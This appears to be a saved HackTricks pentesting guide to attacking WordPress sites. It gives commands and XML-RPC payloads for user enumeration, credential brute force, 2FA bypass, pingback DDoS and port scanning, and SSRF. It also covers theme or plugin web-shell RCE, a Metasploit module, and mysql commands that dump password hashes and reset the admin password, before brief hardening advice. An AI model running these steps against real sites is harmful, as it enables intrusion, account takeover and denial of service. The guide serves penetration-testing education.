# [Wordpress]
Fuente: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress

**Support HackTricks and get benefits!**

## 

Basic Information

**Uploaded** files go to: *http://10.10.10.10/wp-content/uploads/2018/08/a.txt* \_\_**Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in\*\*:\*\* [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php) **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)​

In **wp-config.php** you can find the root password of the database.

Default login paths to check: ***/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/***

## 

**Main WordPress Files**

-   `license.txt` contains useful information such as the version WordPress installed.
    

-   `wp-activate.php` is used for the email activation process when setting up a new WordPress site.
    

-   Login folders (may be renamed to hide it):
    

-   `xmlrpc.php` is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
    

-   The `wp-content` folder is the main directory where plugins and themes are stored.
    

-   `wp-content/uploads/` Is the directory where any files uploaded to the platform are stored.
    

-   `wp-includes/` This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.
    

-   The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.
    

## 

Users Permissions

-   **Editor**: Publish and manages his and others posts
    

-   **Author**: Publish and manage his own posts
    

-   **Contributor**: Write and manage his posts but cannot publish them
    

-   **Subscriber**: Browser posts and edit their profile
    

## 

**Passive Enumeration**

## 

**Get WordPress version**

Check if you can find the files `/license.txt` or `/readme.html`

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-ML_08ynZ86Ozx3XOFIz%2F-ML_OZveHKBK8Rgj1NiS%2Fimage.png?alt=media&token=b826b7e4-c69e-438b-8bdd-bd1a18713155)

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-ML_08ynZ86Ozx3XOFIz%2F-ML_P36Sb7CDQF4etHYB%2Fimage.png?alt=media&token=bdd159fd-b35c-4b64-8d07-13776e2fc017)

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-ML_08ynZ86Ozx3XOFIz%2F-ML_SMRJsnNqjKckfrdu%2Fimage.png?alt=media&token=4c2b2a11-c401-4f7f-ace9-82bfcda3bc22)

## 

Get Plugins

curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

## 

Get Themes

curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

## 

Active enumeration

## 

Plugins and Themes

You probably won't be able to find all the Plugins and Themes passible. In order to discover all of them, you will need to **actively Brute Force a list of Plugins and Themes** (hopefully for us there are automated tools that contains this lists).

## 

Users

You get valid users from a WordPress site by Brute Forcing users IDs:

curl -s -I -X GET http://blog.example.com/?author=1

If the responses are **200** or **30X**, that means that the id is **valid**. If the the response is **400**, then the id is **invalid**.

You can also try to get information about the users by querying:

curl http://blog.example.com/wp-json/wp/v2/users

**Only information about the users that has this feature enable will be provided**.

Also note that ***/wp-json/wp/v2/pages*** *could leak IP addresses\*\*.\*\**

## 

XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process [using this](https://github.com/relarizky/wpxploit) for example).

To see if it is active try to access to ***/xmlrpc.php*** and send this request:

<methodName\>system.listMethods</methodName\>

![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

***wp.getUserBlogs***, \_**wp.getCategories** \_ or ***metaWeblog.getUsersBlogs*** are some of the methods that can be used to brute-force credentials. If you can find any of them you can send something like:

<methodName\>wp.getUsersBlogs</methodName\>

<param\><value\>admin</value\></param\>

<param\><value\>pass</value\></param\>

The message *"Incorrect username or password"* inside a 200 code response should appear if the credentials aren't valid.

Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

![](ReadItLater%20Inbox/assets/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FFX0g2BLsdfdQnq1xXx3N%2Ffile.jpeg..jpeg?alt=media)

This method is meant for programs and not for humans, and old, therefore it doesn't support 2FA. So, if you have valid creds but the main entrance is protected by 2FA, **you might be able to abuse xmlrpc.php to login with those creds bypassing 2FA**. Note that you won't me able to perform all the actions you can do through the console, but you might still be able to get to RCE as Ippsec explains it in [https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)​

If you can find the method ***pingback.ping*** inside the list you can make the Wordpress send an arbitrary request to any host/port. This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).

<methodName\>pingback.ping</methodName\>

<value\><string\>http://<YOUR SERVER \>:<port\></string\></value\>

</param\><param\><value\><string\>http://<SOME VALID BLOG FROM THE SITE \></string\>

</value\></param\></params\>

![](ReadItLater%20Inbox/assets/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-aea4b23cdd94102884b2c4c8d3a1a3f95a65065f%2F1_JaUYIZF8ZjDGGB7ocsZC-g.png..png?alt=media)

If you get **faultCode** with a value **greater** then **0** (17), it means the port is open.

Take a look to the use of \*\*`system.multicall`\*\*in the previous section to learn how to abuse this method to cause DDoS.

## 

wp-cron.php DoS

This file usually exists under the root of the Wordpress site: `/wp-cron.php` When this file is **accessed** a "**heavy**" MySQL **query** is performed, so I could be used by **attackers** to **cause** a **DoS**. Also, by default, the `wp-cron.php` is called on every page load (anytime a client requests any Wordpress page), which on high-traffic sites can cause problems (DoS).

It is recommended to disable Wp-Cron and create a real cronjob inside the host that perform the needed actions in a regular interval (without causing issues).

<methodName\>wp.getUsersBlogs</methodName\>

<param\><value\>username</value\></param\>

<param\><value\>password</value\></param\>

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-LqvJkAq8QsmqJVl5YPk%2F-LqvKsBpB93Bihm-Z85a%2Fimage.png?alt=media&token=0ce1ce38-6243-4db7-9ec4-bd90a6ba1082)

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-LqvJkAq8QsmqJVl5YPk%2F-LqvL04mypTbKS1dqlvO%2Fimage.png?alt=media&token=7d241f68-9463-4d2f-a11a-6a1c8dfec8c8)

<?xml version='1.0' encoding='utf-8'?>

<methodName\>wp.uploadFile</methodName\>

<param\><value\><string\>1</string\></value\></param\>

<param\><value\><string\>username</string\></value\></param\>

<param\><value\><string\>password</string\></value\></param\>

<value\><string\>filename.jpg</string\></value\>

<value\><string\>mime/type</string\></value\>

<value\><base64\><!\[CDATA\[---base64-encoded-data---\]\]></base64\></value\>

<methodName\>pingback.ping</methodName\>

<param\><value\><string\>http://target/</string\></value\></param\>

<param\><value\><string\>http://yoursite.com/and\_some\_valid\_blog\_post\_url</string\></value\></param\>

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-LqvJkAq8QsmqJVl5YPk%2F-LqvLVwCIiR8H92kgeG2%2Fimage.png?alt=media&token=d1dacf17-357a-40d1-b65b-60c7113f1050)

## 

/wp-json/oembed/1.0/proxy - SSRF

Try to access *https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net* and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M3zAylZH1L9eWKLUiD6%2F-M3zN_Wbcm3H6ZHrVUnJ%2Fimage.png?alt=media&token=b3f26580-791a-4552-96cd-562c87d4d1d7)

## 

SSRF

https://github.com/t0gu/quickpress/blob/master/core/requests.go

This tool checks if the **methodName: pingback.ping** and for the path **/wp-json/oembed/1.0/proxy** and if exists, it tries to exploit them.

cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"

wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com \[\--plugins-detection aggressive\] --api-token <API\_TOKEN\> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)

#You can try to bruteforce the admin user using wpscan with "-U admin"

## 

**Panel RCE**

**Modifying a php from the theme used (admin credentials needed)**

Appearance → Editor → 404 Template (at the right)

Change the content for a php shell:

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-Lem1RFfGiN351UCeUMu%2F-LemCr30f_t17t-zA98X%2Fimage.png?alt=media&token=ae4691b4-96e5-4d54-99ca-17626b05daed)

## 

MSF

use exploit/unix/webapp/wp\_admin\_shell\_upload

## 

Plugin RCE

## 

PHP plugin

It may be possible to upload .php files as a plugin. Create your php backdoor using for example:

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-MPYa_kkhESBzGfWpM46%2F-MPYrra6_2NsI5XdVpmt%2Fimage.png?alt=media&token=c1a01593-d0b9-4f0a-80d2-d887c9bf4c91)

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-MPYa_kkhESBzGfWpM46%2F-MPYs4-e_h-mBTY_LXzy%2Fimage.png?alt=media&token=e48598ac-dd16-4d33-a1e0-522e7508b0aa)

Upload plugin and press Install Now:

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-MPYa_kkhESBzGfWpM46%2F-MPYsIF8WsDYJdHukPlz%2Fimage.png?alt=media&token=7ef04544-918a-4b03-8c1b-d38091d1cbd6)

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-MPYa_kkhESBzGfWpM46%2F-MPYsSs-fvxIMs50duO8%2Fimage.png?alt=media&token=f47b897d-9e96-4808-a331-d1136d335b8e)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-MPYa_kkhESBzGfWpM46%2F-MPYsfM7ejTuY34disaD%2Fimage.png?alt=media&token=1b455f77-0450-4ae5-a058-ecf1fb64402f)

Access it and you will see the URL to execute the reverse shell:

![](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-MPYa_kkhESBzGfWpM46%2F-MPYsmN6Znmj2AgONJE6%2Fimage.png?alt=media&token=d41fc848-baa0-43fb-9850-7647b5a315b6)

## 

Uploading and activating malicious plugin

Some time logon users do not own writable authorization to make modifications to the WordPress theme, so we choose “Inject WP pulgin malicious” as an alternative strategy to acquiring a web shell.

So, once you have access to a WordPress dashboard, you can attempt installing a malicious plugin. Here I’ve already downloaded the vulnerable plugin from exploit db.

Click [**here**](https://www.exploit-db.com/exploits/36374) to download the plugin for practice.

![](ReadItLater%20Inbox/assets/10.png..png?w=687&ssl=1)

Since we have zip file for plugin and now it’s time to upload the plugin.

Dashboard > plugins > upload plugin

![](ReadItLater%20Inbox/assets/11.png..png?w=687&ssl=1)

Browse the downloaded zip file as shown.

![](ReadItLater%20Inbox/assets/12.png..png?w=687&ssl=1)

Once the package gets installed successfully, we need to activate the plugin.

![](ReadItLater%20Inbox/assets/13.png..png?w=687&ssl=1)

When everything is well setup then go for exploiting. Since we have installed vulnerable plugin named “reflex-gallery” and it is easily exploitable.

You will get exploit for this vulnerability inside Metasploit framework and thus load the below module and execute the following command:

As the above commands are executed, you will have your meterpreter session. Just as portrayed in this article, there are multiple methods to exploit a WordPress platformed website.

![](ReadItLater%20Inbox/assets/14.png..png?w=687&ssl=1)

## 

Post Exploitation

Extract usernames and passwords:

mysql -u <USERNAME\> --password\=<PASSWORD\> -h localhost -e "use wordpress;select concat\_ws(':', user\_login, user\_pass) from wp\_users;"

mysql -u <USERNAME\> --password\=<PASSWORD\> -h localhost -e "use wordpress;UPDATE wp\_users SET user\_pass=MD5('hacked') WHERE ID = 1;"

## 

WordPress Protection

## 

Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:

define( 'WP\_AUTO\_UPDATE\_CORE', true );

add\_filter( 'auto\_update\_plugin', '\_\_return\_true' );

add\_filter( 'auto\_update\_theme', '\_\_return\_true' );

Also, **only install trustable WordPress plugins and themes**.

## 

Security Plugins

## 

**Other Recommendations**

-   Remove default **admin** user
    

-   Use **strong passwords** and **2FA**
    

-   Periodically **review** users **permissions**
    

-   **Limit login attempts** to prevent Brute Force attacks
    

-   Rename **`wp-admin.php`** file and only allow access internally or from certain IP addresses.
    

## 

​

**Support HackTricks and get benefits!**